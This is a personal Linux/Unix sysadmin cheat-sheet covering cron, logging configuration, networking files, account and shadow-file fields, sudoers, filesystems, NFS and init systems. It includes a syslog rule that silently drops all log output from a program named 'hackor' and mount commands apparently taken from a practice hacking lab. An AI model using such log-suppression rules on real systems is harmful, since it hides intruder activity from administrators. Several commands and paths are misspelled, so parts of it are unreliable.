{{{ ###Config Files 
{{{ #Cron
	- Notes:
		- cron jobs output will be sent to the owners email if output is not specified
	- Locations 
		- System Cron Tables 
			$ cat /etc/crontab /etc/anacrontab /etc/attab
		- System Cron Jobs 
			$ ls -latrd /etc/cron.d/*	/etc/sysconfig/cron.d/*			
		- User Cron Tables  
			$ for user in $(cut -f1 -d: /etc/passwd); do echo $user >> /tmp/crontabs; crontab -u $user -l >> /tmp/crontabs; done
			$ ls -latr /var/spool/{cron,at,anacron}/* 2>/dev/null	
		- Cron Access Control
			- Locations:
				- /etc/cron/allow 	#Implied Deny if not in list 
				- /etc/cron/deny 	#Implied Allow if not in list 
			- One username per line 
			- Either File Can exist	
			- If both exist: 	/allow is Used 
			- If Neither exist:	All users are allowed to make cronjobs	

	- Commands 
		- Change crontab file 
			$ crontab yeet 
		- Remove crontab file 
			$ crontab -r 
		- Get crontab contents 
			$ crontab -l -u squid 	
		- Edit crontab 
			$ crontab -e 	#If Editing the file directly, $ kill -s HUP 3232 	#(crond pid) so the file is reread

}}} #
{{{ #Customization
	- Login Banner
		- /etc/motd

}}} #
{{{ #DNS
	- client 
		- /etc/nsswitch.conf checks the hosts: line for search order (usually files dns) 
			- files = /etc/hosts 
			- dns	= /etc/resolv.conf
				> search: Domain name appended to hostname searches
	- server 
		- /etc/bind/named.conf.options 
		
	- Note:
		-  Entry "hosts: dns [!UNAVAIL=return] files" Means the system will try to resolve the name via DNS, and will only resort to the /etc/hosts file if all DNS servers are down.
	
}}} #
{{{ #Filesystem
	- Persistant Filesystem Configs
		- /etc/fstab 		#Mountable Filesystems (read by fsck, mount, and umount)
		- /etc/default/fs 	#Local File Systems (Solaris)
		- /etc/dfs/fstypes	#NFS File Systems	(Solaris)

}}} #
{{{ #Firewalls
	{{{ #firewalld
		- /usr/lib/firewalld/*				#Default Configs
		- /etc/firewalld/					#User-Defined Configs
		- /etc/firewalld/firewalld.conf		#User-Defined Config
		- /etc/firewalld/services/*.xml 	#User-Defined Services 
		- /etc/firewalld/zones/*.xml		#User-Defined Zones
	
	}}} #
	{{{ #IPTables
		- /etc/sysconfig/iptables 	#CentOS 
		- /etc/sysconfig/ip6tables	#CentOS
		- /etc/iptables/rules.v4	#Debian
		- /etc/iptables/rules.v6	#Debian
		- init scripts 				#Everything else 
	
	}}} #
		
}}} #
{{{ #Kernel 
	- /etc/sysctl.conf
	- Modules to be loaded into kernel at boot 
		- /etc/modules
		- /etc/modules.conf
		- /etc/sysconfig/modules 
		- /boot/loader.conf 	# BSD 

}}} #
{{{ #Logging 
	{{{ #Config Files 
		{{{ #syslog 
			- /etc/syslog.conf		#Logging Rules and Destinations 
			- /etc/sysconfig/syslog	#Server Options 
			- Don't save a programs logs 
				$ if ($programname == "hackor") then ~
			
			- Put relp input into a file 
				```O
				if ($inputname == "imrelp") then
				{
				   *.* /var/log/remote
				}
				```C
			
			- Send output to relp server 
				$ *.*:omrelp:10.10.10.10:1514
			
			- Recieve syslog messages from remote systems via UDP
				$ vim /etc/sysconfig/syslog 
					$ SYSLOGD_OPTIONS="-m 0 -r"
				$ service syslog restart
				$ netstat -natup | grep 514		#UDP
		
		}}} #
		{{{ #rsyslog
			- /etc/rsyslog.conf 
				- Include more files 
					$ $IncludeConfig /etc/rsyslog.d/*.conf 	
				
				- Forward logs from host to host 
					$ if $fromhost == 'linux.ops.local' then { *.* @ftp.ops.local}
					
				- Recieve syslog messages from remote systems via TCP and UDP 
					$ vim /etc/rsyslog.conf 
						```O
						$MODLOAD imudp
						$UDPServerRun 514
						$MODLOAD imtcp
						$InputTCPServerRun 514
						```C
					$ systemctl restart rsyslog
					$ netstat -natup | grep 514		#TCP and UDP
				
				- Enable Persistant Logging 
					$ vim /etc/systemd/journald.conf 
						$ Storage=persistent"
					$ mkdir /var/log/journal 
					- ?restart service?
					
				- Get service message destination (rsyslogd)
					- Get other logging dirs and direct logging lines from...
						$ vim /etc/rsyslog.conf 
							$Include /etc/rsyslog.d/*.conf 
						$ vim /etc/rsyslog.d/sshd.conf 				
		
		}}} #
		{{{ #syslog-ng 
		
		}}} #
		{{{ #journal 
			- /etc/systemd/journald.conf 
				- NOTES:
					- Default config is the commented out lines (to be used as a template)
				- Enable persistant Logging 
					```O
					# mkdir /etc/systemd/journald.conf.d/
					# cat << END > /etc/systemd/journald.conf.d/storage.conf
					[Journal]
					Storage=persistent
					END
					# systemctl restart systemd-journal
					```C
				
			
			}}} #
		{{{ #auditd (auditctl)
			- Config 
				- /etc/audit.conf 
				- /etc/audisp/plugins.d/syslog.conf	
					$ active=yes 	#causes auditd to write messages into syslog
			- Rules
				- /etc/autid/audit.rules 
					$ -w /etc/ -p wa 	#Watch etc with Write and attribute permissions 
				- /etc/audit/rules.d/
		
		}}} #
		{{{ #selinux 
			- /etc/selinux/config 	
			
		}}} #	
		{{{ #Log rotation 
			- logadm (Solaris)(service)
				- /etc/logadm.conf 
				$ logadm -V 		#Reads uncommented lines in /etc/logadm.conf
			- logrotate (linux)(Shell scirpt kicked off by cron usually)
				- /etc/logrotate.conf 
				- /etc/logrotate.d/

		}}} #

	}}} #			
	{{{ #Default logging Locations
		- system log (syslog)
			- Linux 
				- Default Dir:		/var/log 
				- Standard Logs:	/var/log/messages 
				- Authorizaton: 	/var/log/secure 
			- Solaris
				- Default Dir:		/var/adm
				- Standard Logs:	/var/adm/messages 
				- Authorizaton:		Not Logged
			- SystemD journal 
				- /run/log/journal/841ce1341f5c4d9db5825a80ba2a11fc/system.journal
				- /var/log/journal	#If it exists and configured to log to
		
		- auditd/selinux 
			- /var/log/audit/audit.log 
		
		- User Login Records (read with `last` and `lastb`)
			- Linux 
				- /var/run/utmp		#Current Status 
				- /var/log/wtmp 	#Historical Successful Logins
				- /var/log/btmp		#Historical Unuccessful Logins
			- Solaris	(utmpd daemon needs to be running and files need to exist)
				- /var/adm/utmpx	#Current Status 
				- /var/adm/wtmpx 	#Historical Successful Logins
		
		- Application Logs 
			- CentOS 
				- /var/log/maillog
				- /var/log/cron
				- /var/log/spooler
				- /var/log/boot.log 
	}}} #			
	{{{ #Facility's Table
Facility code	| Keyword		| Description
---				| ---			| ---
0 				| kern 			| Kernel messages	
1 				| user 			| User-level messages
2 				| mail 			| Mail system
3 				| daemon 		| System daemons
4 				| auth 			| Security/authentication messages
5 				| syslog 		| Messages generated internally by syslogd
6 				| lpr 			| Line printer subsystem
7 				| news 			| Network news subsystem
8 				| uucp 			| UUCP subsystem
9 				| cron 			| Cron subsystem
10 				| authpriv 		| Security/authentication messages
11 				| ftp 			| FTP daemon
12 				| ntp 			| NTP subsystem
13 				| security 		| Log audit
14 				| console 		| Log alert
15 				| solaris-cron 	| Scheduling daemon
16–23 			| local0–local7 | Locally used facilities 

	}}} #
	{{{ #Severity Levels Table 
Level	| alias		
---		| ---		
0		| emerg		
1		| alert		
2		| crit		
3		| err 		
4		| warning	
5		| notice	
6		| info 		
7		| debug 	
		
	}}} #	
	
}}} #
{{{ #Networking 
	{{{ #CentOS 
		Configuration			| Location
		---						| ---		
		Interface				| /etc/sysconfig/network-scripts/ifcfg-xxx	
		Static Routes			| /etc/sysconfig/network-scripts/route-xxx	(Not Required)
		Gateway/Hostname		| /etc/sysconfig/network 					
		Local Name Resolution	| /etc/hosts 
		DNS Server info 		| /etc/resolv.con 
		Protocols and Ports		| /etc/protocols 
		
		- Get Routes 
			$ egrep -Rin "src|via" /etc/sysconfig/network-scripts/ | grep dev 

	}}} #
	{{{ #Debian 
		Configuration			| Location 
		---						| ---
								| /etc/network 

	}}} #
	{{{ #FreeBSD 
		Configuration			| Location 
		---						| ---
								| /etc/rc.conf 
		
	}}} #	
	{{{ #Solaris 
		Configuration							| Location 
		---										| ---
		Local Name Resolution and System IP's	| /etc/inet/hosts 
		Previous- stored IP, Now link to hosts	| /etc/inet/ipnodes 
		Previous- resolve names, now hosts link | /etc/hosts 
		Gateway									| /etc/defaultrouter
		Gateway									| /etc/gateways		(Only exists if machine is a router or has multiple NICS)
		Is Router?			 					| /etc/notrouter 	(Does not need to exist to not be router)
		Interface								| /etc/hostname.xx
		Hostname								| /etc/nodename 
		Netmasks for each network				| /etc/netmasks
		DNS Server info 						| /etc/resolv.conf 
		Protocols								| /etc/protocols 
		Well-known Ports						| /etc/services 
}}} #
}}} #
{{{ #Networking Examples (CentOS)
	{{{ #ifcfg-eth0
		DEVICE=eth0
		ONBOOT=yes
		TYPE=Ethernet
		HWADDR=00:50:56:9A:0D:A7	#If not correct, interface cannot be enabled
		BOOTPROTO=static			#Static or None means static, otherwise the interface can use DHCP
		IPADDR=192.168.11.13
		NETMASK=255.255.255.0		#Prefix=24 is also an option here
	}}} #
	{{{ #network 
		NETWORKING=yes 
		NETWORKING_IPV6=no 
		HOSTNAME=linux.ops.local
		GATEWAY=192.168.11.254		#GATEWAY may also be defined in ifcfg-eth0
	}}} #
	{{{ #hostname 
		linux.ops.local 
	}}} #
	{{{ #hosts
		##IP and hostname in hosts is generally not required
		127.0.0.1	localhost.localdomain localhost 
		::1		localhost6.localdomain6 localhost6		
	}}} #
	{{{ #route-eth0 
		##Default route could be stored in this file, but is not normal
		##There is another possible format to store routes
		ADDRESS0=172.17.0.0
		NETMASK0=255.255.255.128
		GATEWAY0=192.168.11.15		
	}}} #

}}} #
{{{ #Shell Login | Exit | Init
	- https://kb.iu.edu/d/abdy
	{{{ #Bash
		- Read login scripts 
			$ cat /etc/profile /etc/profile.d/* /etc/bashrc ~squid/.{bash_profile,profile,bashrc} | less 	#Follow Readins 
		- Login Shell 
			- Login (Interactive and Non-Interactive)
				- /etc/profile 
				- ~/.bash_profile
				- ~/.bash_login
				- ~/.profile 
			- Exit (Interactive and Non-Interactive)
				- ~/.bash_logout
				- /etc/bash.bash_logout 
		- Non-Login Shell 
			- Start (Interactive)
				- ~/.bashrc 	
					- Arguments:
						- --norc	#Ignores ~/.bashrc 
						- --rcfile 	#Selects alternative rcfile 
			- Start (Non-Interactive)
				- $BASH_ENV
	}}} #
	{{{ #CSH 
		- Login Shell 
			- Login (Interactive and Non-Interactive)
				- ~/.cshrc 
				- ~/.login ?or? /etc/.login 
			- Exit (Interactive and Non-Interactive)
				- ~/.logout
		- Non-Login Shell (Interactive and Non-Interactive) 
			- ~/.cshrc 
	}}} #
	{{{ #ZSH
		- Login Shell 
			- Login (Interactive) 
				- zshenv
				- zprofile
				- zshrc
				- zlogin
			- Exit (Interactive)
				- zlogout (user)
				- zlogout (system-wide)
			- Login (Non-Interactive)
				- zshenv
				- zshprofile
				- zlogin 
			- Exit (Non-Interactive)
				- zlogout (user)
				- zlogout (system-wide)			
		- Non-Login Shell 
			- Login (Interactive)
				- zshenv
				- zshrc 
			- Exit (Interactive)
				- zlogout (user)
				- zlogout (system-wide)
			- Login (Non-Interactive)
				- zshenv
			- Exit (Non-Interactive)
				- zlogout (user)
				- zlogout (system-wide)			
	}}} #
	
}}} #
{{{ #Users and Permissions
	{{{ #/etc/nsswitch.conf 
		> files:/etc/passwd, /etc/shadow, /etc/group
		> sss: System Security Service Daemon
			- Can manage multiple remote authentication mechanisms (LDAP, FreeIPA, or Windows Active Directory)
			- Can cache creds from multiple databases
			- sssd cache can authenticate and when auth server is offline 
		> ldap: Lightweight Directory Access Protocol 
			> nslcd:(Name Service LDAP Connection Daemon) daemon that can perform LDAP queries for local processes (No Cacheing)
			> nscd: (Name Service Cacheing Daemon) provides a cache for commonly used name service requests
	
	}}} #
	
	{{{ #Files 
		- Defaults for these are located at /etc/login.defs
		{{{ #/etc/passwd
			- User Database File 
			- Example: 
				- root:x:0:0:Super-User:/:/bin/bash
				- Username:Password:UID:GID:GECOS:Home:Shell
			- Fields:
				- Username: (Login Name:
					- Must be different for each user 
				- Password:
					- Usually an "x"
					- Can contain an encrypted password 
				- UID:
					- Unique unless UID is 0 (Superuser privs)
				- GID:
					- Users PRIMARY group 
				- GECOS: (General Electric Comprehensive Operating System)
					- Often blank
					- Holds phone number, address, fullname, etc...
					- Separated by ;
					- https://en.wikipedia.org/wiki/Gecos_field#Format
				- Home:
					- Default login dir 
					- solaris usually: /export/home
					- Everything else: /home 
				- Shell:
					- Default shell at login
					- Also gui terminal default shell 
					- Empty for non-login accounts
		
		}}} #
		{{{ #/etc/shadow
			- Encrypted password information file
			- Modern shadow Optional Field support files (Also hosts default password encryption algorithm)(passwd command)
				- Solaris:	/etc/secuirty/policy.conf
				- BSD:		/etc/login.conf
				- Linux:	/etc/login.defs 
			- Example:
				- bin:*:15980:0:99999:7:::
				- fred::16301:0:99999:7:::
				- Username:Password:LastChg:Min:Max:Warn:Inactive:Expire:Flag
			- Fields:
				- Username
					- login name
				- Password:
					- Blank = can login with no password (for ssh, sshd.conf edit will need to be made)
					- * 	= Account is disabled
					- !!	= Account is locked
					- !password 	= Account is locked
					- *LK*	= Account is locked 
					- NP	= "No Password" No login shell, but may be su'd into
					- UP 	= "to be UPdated" User cannot login because password has not yet been set.
					- Example:
						- $1$WEXcEtlI$MJEs7DG9BeddHhKddHL5w/
						- $algorithm-id$salt$encrypted-password 
					- algorithm-id: 
						- https://hashcat.net/wiki/doku.php?id=example_hashes			
					- if only "encrypted-password" section, the algorithm is DES
				- LastChg:
					- Number of days from January 1, 1970 that have passed since the password was last changed (Unix/POSIX/EPOCH time)
					
				- Min:
					- Number of days before the password may be changed again
				- Max:  
					- Number of days after which a password must be changed
					- If 0, user will be forced to change password on login
				- Warn:
					- Number of days the user is warned before a password expires
				- Inactive:
					- Number of days after a password expires before the account is disabled
				- Expire:
					- Number of days from January 1, 1970 that have passed since the account was disabled
				- Flag:
					- Reserved
					
		}}} #
		{{{ #/etc/group 
		- Lists groups on the system 
		- Example:
			- admins:x:100:fred,squid
			- GroupName:GroupPassword:GID:GroupMembers
		- GroupName:
		- GroupPassword 
			- allows members to join group with `newgrp`. Group is temporarily joined and left with `exit`.
		- GID:
			- Group Unique Identifier
		- GroupMembers:
			- comma seperated list 
			- User secondary groups are listed
			- User primary groups are not listed because it is already done in passwd 

	}}} #
		{{{ #/etc/gshadow
			- Holds group password, AdministratorS, and Members.
				- Administrators: 
					- Change the password or members of the group 
					- Access group without a password 
				- Members:
					- Access group without a password 
			- https://linux.die.net/man/5/gshadow
			- Example: 
				- stooges:$1$asdfasdf$raera/asdfasf:fred:velma
				- GroupName:GroupPassword:Administrators:Members
		
		}}} #
	
	}}} #
	{{{ #IPA:		(Identity, Policy, and Audit)
	
	
	
	}}} #
	{{{ #LDAP		(Lightweight Directory Access Protocol)


	}}} #
	{{{ #NIS		(Network Information Service)
	
	
	
	}}} #
	{{{ #Winbind	(Windows Berkley Internet Name Domain Server)
	
	
	}}} #

	{{{ #/etc/sudoers
		- LAST matching line for a command is applied.
		- Log = $ LogFile="/var/log/yeet/sudofile"	(/var/spool/mail/root if unset)
		- Examples 
			$ Host_Alias	ROUTERS = rtr1, rtr2, rtr3
			$ User_Alias 	NETADMINS = Tony, George
			$ Cmnd_Alias	NETSTUFF = /usr/bin/tcpdump, /usr/local/bin/wireshark
			
			$ %wheel 	ALL = (mysql) NOPASSWD: ALL
			$ NETADMINS 	ROUTERS = (ALL) NETSTUFF			
			- %wheel line 
				- Users in the group "wheel" 
				- On ALL Hosts 
				- Can RunAs mysql 
				- With No password 
				- All commands 
			- NETADMINS line 
				- Users in NETADMINS 
				- On Hosts in ROUTERS 
				- As Any User 
				- Can Run commands in NETSTUFF (Will need user password (probably root))
	
	}}} #

}}} #

}}} ###
{{{ ###Filesystem
{{{ #Attach Filesystem Example
	1. Create the loop device needed to allow the operating system to see the file as a block device
		$ losetup /dev/loop0 /tmp/my_stuff.img	
	2. Mount filesystem to /media/assessment
		$ mkdir /media/assessment
		$ mount /dev/loop0 /media/assessment
	3. Set Volume Label
		$ tune2fs -L assessment /dev/loop0 
	4. Get Volume Label 
		$ e2label /dev/loop0 

}}} #
{{{ #Good To Know Commands
	> dd: convert and copy files
	> diskinfo: prints out information about a disk device, and can run a performance test on the device. #BSD
	> df: get available disk space	$ df -h
	> du: estimate file space usage (in a dir)
	> fdisk: provides disk-partitioning functions
	> fsck: check file consistency
	> fuser:  show which processes are using a specified file 
	> link:
	> mkfs: format a block storage device
	> mount: mounting devices 
	> quota: set a limit of how much disk space a user or a group can use
	> stat: get file details
	> umount: unmounts a previously mounted device

}}} #	
{{{	#Filesystem Info 
	> /boot: superblock follows boot block 
	> mounted partition: superblock is first block 
	> Default configuration: /bin/cat /etc/mke2fs.conf 
	{{{ #General 
		- Get boot device
			$ df -Th		#df only prints mounted file systems (does include NON-REAL disk partitions)
			$ mount 
			$ fdisk -l 		#Physical perspective # Get Swap Partition Location 
		- Get cd drive 
			$ sysctl -a | grep cd 
		- Get volume label
			$ e2label /dev/sda1 
			$ blkid
			$ lsblk
			$ lsblk -o PATH,SIZE,RO,TYPE,MOUNTPOINT,UUID,MODEL
		- Get Superblock (if block size is 1024)
			$ dd if=/dev/sda1 bs=512 skip=2 count=2 | od -t x1
			$ dd if=/dev/sda1 bs=1k skip=1 count=1 | hexdump -C
		- Get Diskusage info
			$ df -h /dirname 		
			$ df -a 
			$ df -i 					#Inode Info 
			$ df 						#If 2nd field is a filesystem location, it is a mounted partition. 
			$ du -sh /FileOrDirname		#Overview
			$ du -ch /FileOrDirname		#Recursive
					
	}}} #
	
	{{{ #btrfs
		$ /sbin/btrfs-show-super -f /dev/sda1 
		$ /sbin/btrfs filesystem usage /dev/sda1
		
	}}} #
	{{{ #ext2-4: 
		$ /sbin/dumpe2fs -h /dev/sda1
		$ /sbin/tune2fs -L assessment /dev/loop0 
		$ /sbin/tune2fs -l /dev/sda1  
		$ /bin/dd if=/dev/sda1 bs=1024 skip=1 count=1 | /usr/bin/hexdump -C 
		- https://www.geeksforgeeks.org/dumpe2fs-command-in-linux-with-examples/
		
	}}} #
	{{{ #swap 
	- Get Swap Partitions info 
		$ swapon -s 
		$ cat /proc/swaps 
	- Get RAM and Swap usage 
		$ free -m 

	}}} #
	{{{ #xfs  
		$ /sbin/xfs_info /dev/sda1		#Get Inode Info 
		$ /sbin/xfs_db 					#No Idea what this is  
		$ /bin/dd if=/dev/sda1 bs=1024 skip=2 count=1 | /bin/hexdump -C 
			- 104&105 = Inode size 
			- 106&107 = Inode block 
	
	}}} #

}}} #
{{{ #Filesystem Manipulation
	- Create loop device 
		$ mkfs -t ext3 /dev/loop0
		$ mkfs -t ext3 -b 1024 /dev/loop0
		$ mkfs.ext3 -b 1024 /dev/loop0 -j -L my_stuff		
	- Create an iso file from all the contents of /etc
		$ mkisofs -iso-level 3 -o /tmp/my_stuff.iso /etc
	- Create a file accessible as a block device
		$ losetup /dev/loop0 /tmp/my_stuff.img		#my_stuff.img is the original file  
	- Create a file with 250MB of null bytes 
		$ dd if=/dev/zero of=/tmp/my_stuff.img bs=2M count=125
	- Mount Remote Devices
		$ mount -t cifs -o username=Finance //10.10.10.59/ACCT /mnt/smb/  
		$ guestmount --add /mnt/Bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
	- Mount iso on filesystem 
		$ mount /dev/loop1 /media 
		$ mount -t iso9660 /dev/loop1 /media 	
	- Unmount multiple images at once
		$ umount /mnt /media

}}} #
{{{ #NFS Share Info
	- Get Export table (Shared dirs)
		$ exportfs -vs	#Share options/permissions
		$ showmount -e	#systems that can connect
		$ cat /etc/exports 
		$ ls /etc/exports.d/*.exports
		$ cat /var/lib/nfs/rmtab
	- Get Clients Mounted to Host
		$ showmount -a 
		$ cat /var/lib/nfs/rmtab
		$ netstat -tunp | grep 2049
	- Get Global NFS config 
		$ cat /etc/nfsmount.conf 
	- Get NFS logs 
		$ grep mountd /var/log/messages
		$ grep rpc /var/log/messages 
	- Get Mounted file systems 
		$ cat /etc/mtab
	- Get Filesystems the System can Mount 
		- Linux 
			$ cat /etc/fstab 
		- Solaris 
			$ cat /etc/vfstab	#Table of file system defaults

}}} #
{{{ #NFS Share Manipulation
		- Share a dir (probably)
			$ vim /etc/exports	#todo: Add Example
			$ exportfs -a 
	
}}} #
{{{ #Timestamps
	> mtime: (Modified Time) Updated when Contents are Changed 
		$ ls -l
		- File 
			- Creation
			- Contents are Changed 
			- File is open for writing (open() system call)
		- Dir 
			- Creation
			- Files is Added, deleted
	> atime: (Access Time)
		$ ls -lu
		- File 
			- Reads
			- cp 	(og file)
			- When atime is older then mtime 
			- When the atime is older then x amount of time (RHEL=1day)
	> ctime: (Change Time) (Attributes Change)
		$ ls -lc 
		- File/Dir 
			- Creation
			- Chown/Chgrp/Permissions
			- Move 
			- Hard link to object
			- mtime update 
			- atime update (sometimes)
		
	- Notes
		- When mtime changes, ctime does change
		- When ctime changes, mtime does not Change
}}} #
	
}}} ###
{{{ ###Init Systems/Services
{{{ #Init System Identification
	- get init system 
		$ man init 
		$ compgen -c | egrep "^service$|^chkconfig$|^initctl$|^update-rc.d$|^systemctl$|^svcs$" | sort -u 
		$ ls -la /sbin/init 
		$ dpkg -S /lib/systemd/system 
		$ ps -fp 1

}}} #
{{{ #RunLevel/Target/Milestone
	{{{ #Get Current runlevel/target/Milestone 
		- SMF 
			$ who -r 
			$ svcs milestone*
		- SysD 
			$ journalctl | grep Reached | tail -n 1
			$ systemctl list-units --type=target # If graphical.target exists it's that. Else, multi-user.target 
			$ systemctl list-units --type=target | egrep "emergency|rescue|graphical|multi-user" | head -1
			$ who -r
		- SysV
			$ who -r 	#Will also show previous 
			$ runlevel 	#Will also show previous. Format: Previous Current
		- Upstart 
			$ who -r 
			$ runlevel 
	}}} #
	{{{ #Get Default runlevel/target/Milestone 
			- SMF 
				$ svcprop svc:/system/svc/restarter:default/:properties /options/milestone #If unset, it is multi-user-server 
			- SysD 
				$ systemctl get-default 
				$ ls -l /etc/systemd/system/defualt.target #(symbolic link to /usr/lib/systemd/system/X.target) #/etc/inittab is ignored
			- SysV
				$ cat /etc/inittab | grep initdefault
			- Upstart
				$ cat /etc/init/rc-sysinit.conf	#env DEFAULT_RUNLEVEL=runlevel
				- or -
				$ cat /etc/inittab #id:<runlevel>:initdefault

	}}} #
	{{{ #Set Current runlevel/target/milestone
			- SMF 
				$ svcadm milestone multi-user 
			- SysD 
				$ systemctl isolate multi-user.target #0 poweroff, 0.5 emergency, 1 rescure, 234 multi-user, 5 graphical, 6 reboot 
			- SysV
				$ init 3
			- Upstart 
				$ telinit 3	
				- or 
				$ init 3 
	}}} #
	{{{ #Set Default runlevel/target/milestone
			- SMF 
				$ svcadm milestone -d multi-user #updates default milestone and changes current milestone 
			- SysD 
				$ systemctl set-default multi-user.target
				- or -
				$ rm /etc/systemd/system/defualt.target 
				$ ln -s /usr/lib/systemd/system/muilt-user.target /etc/systemd/system/defualt.target 
			- SysV 
				$ vim /etc/inittab #edit initdefault
			- Upstart 
				$ vim  /etc/init/rc-sysinit.conf	#env DEFAULT_RUNLEVEL=runlevel
				- or -
				$ vim /etc/inittab #id:<runlevel>:initdefault
				
	}}} #
	{{{ #Tables
		{{{ #Milestone Table
			Milestone			| Runlevel
			---					| ---
			none				| N/A
			single-user			| S
			multi-user 			| 2
			Multi-User-server 	| 3
			all					| 3

			Milestones
			1. Devices
			2. Sysconfig
			3. Network
			4. Name-Services 
			5. Single-User 
			6. Multi-User
			7. Multi-User Server 
		
		}}} #	
		{{{ #Runlevel Table 
			Runlevel	| Purpose (Linux)				
			---			| ---							
			0			| System Shutdown				
			1 (S)		| Single-User Mode				
			2			| Multi-User Mode Non-Networked	
			3			| Multi-User Mode Networked		
			4			| Extra/Unused					
			5			| GUI Mode 						
			6			| Reboot			
		
		}}} #
		{{{ #Target Table
			Runlevel| Target 
			---		| ---
			0		| poweroff.target 
			1		| rescure.target 
			2		| multi-user.target
			3		| multi-user.target
			4		| multi-user.target
			5		| graphical.target
			6		| reboot.target 
			
			- target "levels" order 
			- local-fs-pre.target 
			- local-fs.target
			- sysinit.target
			- basic.target		
			- multi-user.target	(similar to runlevel 3)
			- graphical.target  (similar to runlevel 5)
			
		}}} #

}}} #

}}} #
{{{ #Service Info  
	{{{ #Get Services Configured to Start on boot/runlevel change 
			- SMF 
				$ svcs -a | egrep 'online|legacy_run.*rc[0123S]_d'
			- SysD 
				$ systemctl list-unit-files -t service | grep enabled 
				$ systemctl list-dependencies multi-user.target --no-pager 
				$ systemctl list-dependencies default.target | egrep '.*\.service$' | awk -F "[^[:alnum:]|.]" '{print $NF}' | sort | uniq 	#Not it 	
			- SysV
				- Notes:
					- Read inittab and follow the chain 
				- Redhat
					$ chkconfig --list
				- Debian
					$ insserv -s 
					$ insserv -s | awk -F ':' '$1~/S/ && $3~/.*[S2].*/{print $4}' | sort | uniq | wc -l 
					$ find /etc/rc2.d -name S* #Runlevel change 
					$ find /etc/rcS.d /etc/rc2.d -name S* | sed -r 's/\/etc\/rc..d\/...//' | sort | uniq | wc -l #Boot
			- Upstart
				- boot 
					$ initctl show-config
				- Runlevel Change 
					- Parse .conf files for "start on [0256]" 
					- Where it is not running currently and will start on the next 
					- If RC is set to start, go through the SYSV boolean. (K 100 > 0: S 0 > 100:)
				

	}}} #	
	{{{ #Get Runlevels a Service will Start at 
		- SMF 
			- todo:
		- SysD 
			- Read unit file? (WantedBy)
			$ find `find / -name "*.target.wants"` -name yeet.service
		- SysV
			$ find /etc/rc[0-9].d -name "S*auditd"
		- Upstart 
			$ cat /etc/init/cron.conf
			
	}}} #
	{{{ #Get Service Status
		- SMF 
			$ svcs -l ssh
			$ inetadm
		- SysD 
			$ systemctl status yeet
		- SysV
			$ service sshd status 
		- Upstart 
			$ initctl status ssh 
	}}} #
	{{{ #Get All Available Services 
		- SMF 
			$ svcs -a 
		- SysD 
			$ systemctl list-units --type=service --all #Get all Loaded services 
			$ systemctl list-unit-files -t service 		#Get all Available services
		- SysV
			$ service --status-all 	#+=Running -=Stopped ?=Cannot be determined 
		- Upstart 
			$ initctl list 
	}}} #
	{{{ #Get All Enabled Services 
		- SMF
			$ svcs -a | egrep "^online.*"	#N/A really though
		- SysD 
			$ systemctl list-unit-files -t service | grep enabled 
		- SysV
			- N/A (If link exists in rc..d, it's enabled)
		- Upstart
			- N/A (Sort of, you can disable a service, so if this file does not exist, it is "enabled")
				$ echo manual >> /etc/init/sshd.override
				
	}}} #
	{{{ #Get all Running Services 
		- SMF
			$ svcs -a | egrep 'online'
		- SysD 
			$ systemctl list-units --type=service --state=running 
		- SysV 
			$ service --status-all 
		- Upstart 
			$ initctl list | grep /running 
	
	}}} #
	{{{ #Get Service dependencies 
		- SMF
		- SysD 
			$ systemctl list-dependencies sshd --no-pager
			$ systemctl list-dependencies sshd.service | egrep '.*\.service$' | awk -F "[^[:alnum:]|.]" '{print $NF}' | sort | uniq 
			$ systemctl list-dependencies default.target | egrep '.*\.target$' | awk -F "[^[:alnum:]|.]" '{print $NF}' | sort | uniq 
		- SysV
			$ vim /etc/init.d/.depend.start (stop)
		- Upstart 
			$ vim /etc/init/ssh.conf	#start on and stop on lines
	- Get Service dependendents (Things that depend on the service)
		- SMF
		- SysD 
			$ systemctl list-dependencies sshd --reverse 
		- SysV 
			$ vim /etc/init.d/.depend.start (stop)
		- Upstart 
			$ grep "gdm" /etc/init/*	#If referenced in a "start|stop on" line, it is depended upon.  
		
	}}} #

}}} #
{{{ #Service Manipulation
	{{{ #Start Service
		- SMF 
			$ svcadm enable -t ssh
		- SysD 
			$ systemctl start sshd.service 
		- SysV
			$ servcie sshd start 
			$ /etc/init.d/apache2 start 
		- Upstart 
			$ initctl start ssh
	}}} #
	{{{ #Stop Service
		- SMF 
			$ svcadm disable -t ssh
		- SysD 
			$ systemctl stop sshd.service 
		- SysV
			$ service sshd stop
			$ /etc/init.d/apache2 stop 
		- Upstart 
			$ initctl stop ssh 
	}}} # 
	{{{ #Restart Service
		- SMF 
			$ svcadm restart sshd 
		- SysD 
			$ systemctl restert sshd.service 
		- SysV	
			$ service sshd restart 
			$ /etc/init.d/apache2 restart
		- Upstart
			$ initctl restart ssh
	}}} #
	{{{ #Enable a Service
		- SMF 
			$ svcadm enable sshd 
		- SysD 
			$ systemctl enable sshd.service 
		- SysV
			- Redhat
				$ chkconfig sshd on --level 35 #3 and 5 are runlevels here
			- Debian 
				$ update-rc.d auditd enable 2
				$ mv /etc/rc3.d/K01auditd /etc/rc3.d/S01auditd
		- Upstart 
			- N/A (Sort of, you can disable a service, so if this file does not exist, it is "enabled")
				$ echo manual >> /etc/init/sshd.override
	}}} #
	{{{ #Disable a Service
		- SMF 
			$ svcadm disable sshd 
		- SysD 
			$ systemctl disable sshd.service 
		- SysV	
			- Redhat
				$ chkconfig sshd off --level 35 #3 and 5 are runlevels here
			- Debian
				$ update-rc.d auditd enable 2
		- Upstart 
			- N/A (Sort of, you can disable a service, so if this file does not exist, it is "enabled")
				$ echo manual >> /etc/init/sshd.override
	}}} #	
}}} #
{{{ #Service/Job Creation
	{{{ #SMF
		1. Pray you don't have to 
		2. http://uadmin.nl/init/exercise-add-smf-service/
		
	}}} #
	{{{ #SystemD
		{{{ #How to Make a SysD SysV service
			- create service shell script in /etc/rc.d/init.d/yeet
			- create soft link to it under prefered runlevels (/etc/rc.d/rc3.d/yeet)
			- Will be ran at next runlevel 
			- NOTE: you can use rc.local if you make it executable.
		   
		}}} #
		{{{ #How to Make a SysD service
			1. add a unit file to /usr/lib/systemd/system/yeet.service 
				- bare minimum 
					```O
					[Service]
					ExecStart=/opt/yeetscript -stfu
					```C
				- To make service enableable (when enabled this will create a symlink to /etc/systemd/system/multi-user.target.wants/)
					```O
					[Install]
					WantedBy=multi-user.target
					```C
			2. Reload Daemons 
				$ systemctl daemon-reload
